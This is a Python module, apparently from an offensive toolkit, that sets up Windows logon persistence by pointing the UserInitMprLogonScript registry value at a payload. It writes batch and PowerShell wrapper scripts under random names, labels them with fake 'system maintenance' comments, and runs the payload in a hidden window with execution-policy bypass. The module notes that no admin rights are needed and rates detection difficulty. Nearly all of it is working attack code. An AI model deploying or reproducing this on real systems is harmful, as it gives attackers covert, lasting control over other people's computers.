"""
Logon script persistence via environment variables
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.utils import run_command, validate_payload_path, generate_random_name
from config import REGISTRY_PATHS, DEFAULT_STAGING_DIR


class LogonScriptPersistence:
    """Handles logon script persistence via UserInitMprLogonScript"""
    
    def __init__(self):
        self.environment_path = REGISTRY_PATHS['environment']
    
    def install(self, payload_path, staging_dir=DEFAULT_STAGING_DIR):
        """
        Install persistence via logon script
        Creates a wrapper script that executes the payload
        
        Args:
            payload_path (str): Path to payload
            staging_dir (str): Directory to store wrapper script
            
        Returns:
            dict: Installation result with removal command
        """
        print("[*] Installing Logon Script persistence...")
        
        # Validate payload
        is_valid, error = validate_payload_path(payload_path)
        if not is_valid:
            print(f"[-] Invalid payload: {error}")
            return None
        
        # Generate wrapper script name
        script_name = generate_random_name() + ".bat"
        script_path = os.path.join(staging_dir, script_name)
        
        print(f"[*] Creating wrapper script: {script_path}")
        
        # Create batch script that runs payload in background
        script_content = f'''@echo off
REM Windows System Handler
REM Auto-generated maintenance script

start /b "" "{payload_path}"
exit
'''
        
        try:
            # Write wrapper script
            with open(script_path, 'w') as f:
                f.write(script_content)
            
            print(f"[+] Wrapper script created: {script_path}")
            
            # Set UserInitMprLogonScript to point to our wrapper
            command = f'reg add "{self.environment_path}" /v UserInitMprLogonScript /t REG_SZ /d "{script_path}" /f'
            result = run_command(command)
            
            if result and result['success']:
                print(f"[+] Persistence installed successfully!")
                print(f"    Location: {self.environment_path}\\UserInitMprLogonScript")
                print(f"    Wrapper: {script_path}")
                print(f"    Payload: {payload_path}")
                print(f"    Trigger: User login (MPR logon)")
                print(f"    Admin Required: No")
                print(f"    Detection: Medium difficulty")
                
                return {
                    'method': 'logon_script',
                    'path': self.environment_path,
                    'script': script_path,
                    'payload': payload_path,
                    'requires_admin': False,
                    'remove_command': f'reg delete "{self.environment_path}" /v UserInitMprLogonScript /f && del "{script_path}"'
                }
            else:
                print(f"[-] Failed to set registry value")
                if result:
                    print(f"    Error: {result.get('stderr', 'Unknown error')}")
                
                # Clean up wrapper script
                try:
                    os.remove(script_path)
                except Exception:
                    pass
                
                return None
                
        except Exception as e:
            print(f"[-] Error creating wrapper script: {e}")
            return None
    
    def install_powershell(self, payload_path, staging_dir=DEFAULT_STAGING_DIR):
        """
        Install persistence via PowerShell logon script
        More stealthy than batch script
        
        Args:
            payload_path (str): Path to payload
            staging_dir (str): Directory to store wrapper script
            
        Returns:
            dict: Installation result with removal command
        """
        print("[*] Installing PowerShell Logon Script persistence...")
        
        # Validate payload
        is_valid, error = validate_payload_path(payload_path)
        if not is_valid:
            print(f"[-] Invalid payload: {error}")
            return None
        
        # Generate wrapper script name
        script_name = generate_random_name() + ".ps1"
        script_path = os.path.join(staging_dir, script_name)
        
        print(f"[*] Creating PowerShell wrapper: {script_path}")
        
        # Create PowerShell script
        script_content = f'''# Windows System Maintenance Script
# Auto-generated

Start-Process -FilePath "{payload_path}" -WindowStyle Hidden -NoNewWindow
'''
        
        try:
            # Write wrapper script
            with open(script_path, 'w') as f:
                f.write(script_content)
            
            print(f"[+] PowerShell wrapper created: {script_path}")
            
            # Create command to execute PowerShell script
            ps_command = f'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "{script_path}"'
            
            # Set UserInitMprLogonScript
            command = f'reg add "{self.environment_path}" /v UserInitMprLogonScript /t REG_SZ /d "{ps_command}" /f'
            result = run_command(command)
            
            if result and result['success']:
                print(f"[+] Persistence installed successfully!")
                print(f"    Location: {self.environment_path}\\UserInitMprLogonScript")
                print(f"    Wrapper: {script_path}")
                print(f"    Payload: {payload_path}")
                print(f"    Trigger: User login (PowerShell)")
                print(f"    Admin Required: No")
                print(f"    Detection: Medium difficulty")
                
                return {
                    'method': 'logon_script_powershell',
                    'path': self.environment_path,
                    'script': script_path,
                    'payload': payload_path,
                    'requires_admin': False,
                    'remove_command': f'reg delete "{self.environment_path}" /v UserInitMprLogonScript /f && del "{script_path}"'
                }
            else:
                print(f"[-] Failed to set registry value")
                if result:
                    print(f"    Error: {result.get('stderr', 'Unknown error')}")
                
                # Clean up wrapper script
                try:
                    os.remove(script_path)
                except Exception:
                    pass
                
                return None
                
        except Exception as e:
            print(f"[-] Error creating PowerShell wrapper: {e}")
            return None
    
    def get_current_logon_script(self):
        """
        Get current logon script configuration
        
        Returns:
            str: Current logon script value or None
        """
        query_cmd = f'reg query "{self.environment_path}" /v UserInitMprLogonScript'
        result = run_command(query_cmd)
        
        if result and result['success']:
            for line in result['stdout'].split('\n'):
                if 'UserInitMprLogonScript' in line and 'REG_SZ' in line:
                    return line.split('REG_SZ')[-1].strip()
        
        return None